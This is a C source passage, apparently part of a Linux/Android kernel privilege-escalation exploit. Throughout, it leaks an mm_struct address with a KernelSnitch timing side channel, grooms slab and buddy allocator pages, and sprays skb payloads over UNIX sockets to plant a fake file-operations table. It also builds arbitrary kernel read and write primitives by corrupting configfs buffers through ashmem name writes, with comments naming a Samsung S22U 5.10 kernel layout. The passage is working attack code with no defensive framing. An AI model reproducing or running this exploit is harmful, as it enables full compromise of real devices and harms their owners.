  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, ks_verbose, 0);

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.childs[i] = clone_child();
  }
  child_leak = clone_leak_child();
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.childs[i] = clone_child();
  }

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.memfds[i] = open_memfd(pre_ctx.childs[i]);
  }
  memfd_leak = open_memfd(child_leak);
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);
  }

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    kill_child(pre_ctx.childs[i]);
  }
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    kill_child(post_ctx.childs[i]);
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    kill_child(spray_ctx.childs[i]);
  }
  /* Pin prepare mm_structs only via memfds (refcount 1) so late drain
   * actually frees them.  Live prepare children keep the slab occupied
   * and the leak page never discard_slab's onto buddy. */
  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    kill_child(prepare_ctx.childs[i]);
    prepare_ctx.childs[i] = -1;
  }
  SYSCHK(waitpid(child_leak, NULL, 0));

  if (!kernelsnitch_found_collisions(ks)) {
    pr_warning("KernelSnitch collision finding failed\n");
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  kernelsnitch_bruteforce(ks);
  uintptr_t leaked = ks->mm_struct;
  pr_info("KernelSnitch bruteforce mm=%016zx collisions=%d mm_sz=%zx\n",
          leaked, KSNITCH_COLLISIONS, (size_t)MM_STRUCT_SZ);
  if (leaked == (uintptr_t)-1) {
    pr_warning("KernelSnitch mm_struct leak failed\n");
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  uintptr_t leaked_base = leaked & ~(ORDER3_SIZE - 1);
  pr_info("prepare_kernel_page leaked_mm=%016zx leaked_base=%016zx mode=%d\n",
          leaked, leaked_base, payload_mode);
  if (!prepare_skb_payload(leaked_base, payload_mode)) {
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }
  /* Unique tag at the start of the order-3 frag so GDB/trace can find
   * the planted page even when it is not the leaked mm_struct slab. */
  /* Magic at page+0 so GDB/find can locate the planted order-3 frag. */
  uint64_t plant_tag = 0x4349465041474533ULL; /* "CIFPAGE3" */
  memcpy(skb_buf + SKB_FRAG_BIAS, &plant_tag, sizeof(plant_tag));
  memcpy(skb_buf + SKB_FRAG_BIAS + 8, &leaked_base, sizeof(leaked_base));
  pr_info("skb plant tag at frag0 leaked_base=%016zx\n", leaked_base);

  init_reclaim_sv();
  int sndbuf = 1 << 20;
  for (int p = 0; p < SKB_RECLAIM_PAIRS; p++) {
    SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv[p]));
    setsockopt(reclaim_sv[p][0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    int reclaim_flags = fcntl(reclaim_sv[p][0], F_GETFL, 0);
    if (reclaim_flags >= 0) {
      fcntl(reclaim_sv[p][0], F_SETFL, reclaim_flags | O_NONBLOCK);
    }
  }
  int pcp_shaping_sv[2];
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_shaping_sv));

  struct iovec iov;
  memset(&iov, 0, sizeof(iov));
  iov.iov_base = skb_buf;
  iov.iov_len = SKB_SEND_SIZE;

  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  ssize_t shape_sent = SYSCHK(sendmsg(pcp_shaping_sv[0], &msg, 0));
  pr_info("skb shape send len=%zu sent=%zd errno=%d\n",
          (size_t)SKB_SEND_SIZE, shape_sent, errno);

  pin_to_core(CORE);
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    SYSCHK(close(pre_ctx.memfds[i]));
    pre_ctx.memfds[i] = -1;
  }
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    SYSCHK(close(post_ctx.memfds[i]));
    post_ctx.memfds[i] = -1;
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
    SYSCHK(close(spray_ctx.memfds[i]));
    spray_ctx.memfds[i] = -1;
  }

  SYSCHK(close(pcp_shaping_sv[0]));
  SYSCHK(close(pcp_shaping_sv[1]));

  /*
   * 5.10 SLUB: close(leak) FREE_FROZEN keeps inuse=0 on cpu_partial.
   * Prefill order-0 then absorb free_area[3] before the late drain
   * discards the leak slab onto buddy.  Drain-before-close never
   * discard_slab's a frozen slab.
   */
  SYSCHK(close(memfd_leak));
  memfd_leak = -1;
  prefill_order0_buddy();
  {
    /* Absorb with a blank skb so CIFPAGE3 only marks reclaim frags. */
    unsigned char *blank = calloc(1, SKB_SEND_SIZE);
    struct iovec blank_iov;
    struct msghdr blank_msg;
    if (blank) {
      memset(&blank_iov, 0, sizeof(blank_iov));
      memset(&blank_msg, 0, sizeof(blank_msg));
      blank_iov.iov_base = blank;
      blank_iov.iov_len = SKB_SEND_SIZE;
      blank_msg.msg_iov = &blank_iov;
      blank_msg.msg_iovlen = 1;
      order3_hold_begin(&blank_msg);
      free(blank);
    } else {
      order3_hold_begin(&msg);
    }
  }

  for (size_t i = 0; i < prepare_ctx.mm_cnt; i += mm_objs_per_slab) {
    if (prepare_ctx.memfds[i] >= 0) {
      SYSCHK(close(prepare_ctx.memfds[i]));
      prepare_ctx.memfds[i] = -1;
    }
  }

  /* Hold-all: queue undrained skbs across SKB_RECLAIM_PAIRS.  One pair
   * fills after a few 36KB skbs (wmem_max); 8 pairs hold the leak page
   * plus neighbors so a TAIL-inserted discard still has a capture slot. */
  int skb_sent = 0;
  for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
    int pair = i % SKB_RECLAIM_PAIRS;
    errno = 0;
    ssize_t sent = sendmsg(reclaim_sv[pair][0], &msg, MSG_DONTWAIT);
    pr_info("skb reclaim send i=%d pair=%d len=%zu sent=%zd errno=%d leaked_base=%016zx\n",
            i, pair, (size_t)SKB_SEND_SIZE, sent, errno, leaked_base);
    if (sent <= 0) {
      break;
    }
    skb_sent++;
  }
  pr_info("skb reclaim hold-all sent=%d/%d pairs=%d leaked_base=%016zx\n",
          skb_sent, SKB_RECLAIM_SENDS, SKB_RECLAIM_PAIRS, leaked_base);
  /* Capture is queued; drop the absorb pile so leftover order-3 pages
   * do not sit on HEAD for the next round. */
  order3_hold_end();
  kernelsnitch_cleanup(ks);
  ks = NULL;

  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    if (prepare_ctx.memfds[i] >= 0) {
      SYSCHK(close(prepare_ctx.memfds[i]));
      prepare_ctx.memfds[i] = -1;
    }
  }

  uintptr_t planted = 0;
  const char *plant_env = getenv("FOPS_PLANTED_PAGE");
  int wait_planted =
      getenv("FOPS_WAIT_PLANTED") && getenv("FOPS_WAIT_PLANTED")[0] != '0';
  if (plant_env && plant_env[0]) {
    planted = (uintptr_t)strtoull(plant_env, NULL, 0);
    pr_info("skb planted page from env=%016zx leaked_base=%016zx\n",
            planted, leaked_base);
  }
  if (!planted && wait_planted) {
    char line[128];
    pr_info("FOPS_WAIT_PLANTED leaked_base=%016zx; send planted direct page\n",
            leaked_base);
    if (fgets(line, sizeof(line), stdin)) {
      char *p = line;
      while (*p == ' ' || *p == '\t') {
        p++;
      }
      planted = (uintptr_t)strtoull(p, NULL, 0);
      if (!planted) {
        planted = (uintptr_t)strtoull(p, NULL, 16);
      }
      pr_info("skb planted page from stdin=%016zx raw=%s", planted, line);
    }
  }
  if (planted) {
    uintptr_t planted_base = planted & ~(ORDER3_SIZE - 1);
    /* Recompute overlay addresses from the planted page.  Do not resend
     * skb: a second sendmsg lands on a different order-3 page.  The
     * first plant already wrote a page-independent fops table. */
    if (!prepare_skb_payload(planted_base, payload_mode)) {
      return 0;
    }
    pr_info("skb using planted_base=%016zx leaked_base=%016zx lock=%016zx "
            "w0=%016zx fops=%016zx\n",
            planted_base, leaked_base, fake_lock, fake_w0, fake_fops);
    return planted_base;
  }
  pr_info("skb using leaked_base=%016zx lock=%016zx (no planted page yet)\n",
          leaked_base, fake_lock);
  return leaked_base;
}

uintptr_t prepare_good_kernel_page(int payload_mode) {
  int max_attempts = KERNEL_PAGE_SETUP_ATTEMPTS;
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    max_attempts = SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS;
  } else if (payload_mode == PAGE_PAYLOAD_FOPS) {
    max_attempts = FOPS_KERNEL_PAGE_SETUP_ATTEMPTS;
  }
  if (getenv("FOPS_PAGE_DRY_RUN") && getenv("FOPS_PAGE_DRY_RUN")[0] != '0') {
    max_attempts = 3;
  }
  for (int attempt = 1; attempt <= max_attempts; attempt++) {
    uintptr_t base = prepare_kernel_page(payload_mode);
    if (base) {
      return base;
    }
    pr_warning("prepare_kernel_page retry %d/%d\n", attempt,
               max_attempts);
  }
  pr_warning("prepare_kernel_page did not find usable nonzero source pointers\n");
  return 0;
}

ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t len) {
  unsigned char blob[128];
  memset(blob, 0, sizeof(blob));
#ifdef PSELECT_WAITER_LAYOUT_5_10
  /*
   * S22U overlay: 24-bit-aligned bin_buffer, real offset in *ppos.
   * Punch zeros from the end so ashmem mutex at +0x20 stays 0.
   *
   * write_bin does ldrsw of bin_buffer_size and, if *ppos+count is
   * larger, vmallocs then vfree's the overlay dest (the planted
   * page).  Size must be a positive signed 32-bit value with no
   * zero bytes so later SET_NAME punches cannot wipe it back to 0.
   */
  off_t pos = (off_t)(target & 0xffffffULL);
  uintptr_t aligned = target - (uintptr_t)pos;
  put64(blob, CFG_BIN_BUFFER_OFF - ASHMEM_NAME_PREFIX_LEN, aligned);
  put32(blob, CFG_BIN_BUFFER_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN,
        0x7f7f7f7fu);
  put32(blob, CFG_CB_MAX_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
#else
  off_t pos = 0;
  put64(blob, CFG_BIN_BUFFER_OFF - ASHMEM_NAME_PREFIX_LEN, target);
  put32(blob, CFG_BIN_BUFFER_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, len);
  put32(blob, CFG_CB_MAX_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
#endif
  errno = 0;
  int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
  int set_errno = errno;
  if (set_ret != 0) {
    errno = set_errno;
    return -1;
  }

  errno = 0;
  ssize_t wr = pwrite(fd, data, len, pos);
  return wr;
}

ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
  unsigned char blob[128];
  memset(blob, 0, sizeof(blob));
#ifdef PSELECT_WAITER_LAYOUT_5_10
  off_t pos = (off_t)(target & 0xffffffULL);
  uintptr_t page = target - (uintptr_t)pos;
  put64(blob, CFG_PAGE_OFF - ASHMEM_NAME_PREFIX_LEN, page);
  put32(blob, CFG_NEEDS_READ_FILL_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
#else
  off_t pos = (off_t)(ASHMEM_PREFIX_COUNT - len);
  uintptr_t page = target - (uintptr_t)pos;
#ifdef CONFIGFS_USE_FILE_RW
  put64(blob, CFG_BIN_BUFFER_OFF - ASHMEM_NAME_PREFIX_LEN, page);
  put32(blob, CFG_BIN_BUFFER_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN,
        (uint32_t)(pos + (off_t)len));
  put32(blob, CFG_NEEDS_READ_FILL_OFF - ASHMEM_NAME_PREFIX_LEN, 1);
#else
  put64(blob, CFG_PAGE_OFF - ASHMEM_NAME_PREFIX_LEN, page);
  put32(blob, CFG_NEEDS_READ_FILL_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
#endif
#endif
  errno = 0;
  int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
  int set_errno = errno;
  if (set_ret != 0) {
    errno = set_errno;
    return -1;
  }

  errno = 0;
  ssize_t rd = pread(fd, data, len, pos);
  return rd;
}

int is_kernel_ptr(uintptr_t value) {
  return value >= 0xffff800000000000ULL;
}

int is_direct_ptr(uintptr_t value) {
  if (value >= DIRECT_MAP_BASE && value < DIRECT_MAP_END) {
    return 1;
  }
#ifdef TARGET_PAGE_DIRECT_BASE
  /* 5.10 copy_page_from_iter linear window, distinct from PAGE_OFFSET. */
  if (value >= TARGET_PAGE_DIRECT_BASE &&
      value < TARGET_PAGE_DIRECT_BASE + 0x008000000000ULL) {
    return 1;
  }
#endif
#ifdef KIMAGE_TEXT_BASE
  /* nokaslr kimage mapping: init_task / cred live here, not only PAGE_OFFSET. */
  if (value >= KIMAGE_TEXT_BASE &&
      value < KIMAGE_TEXT_BASE + 0x008000000000ULL) {
    return 1;
  }
#endif
  return 0;
}

uint64_t kernel_read64(int fd, uintptr_t target) {
  uint64_t value = 0;
  ssize_t n = kernel_read_data(fd, target, &value, sizeof(value));
  if (n != (ssize_t)sizeof(value)) {
    return 0;
  }
  return value;
}

ssize_t kernel_write_data(int fd, uintptr_t target, const void *data, size_t len) {
  return configfs_write_once(fd, target, data, len);
}

ssize_t kernel_read_data(int fd, uintptr_t target, void *data, size_t len) {
  return configfs_read_once(fd, target, data, len);
}
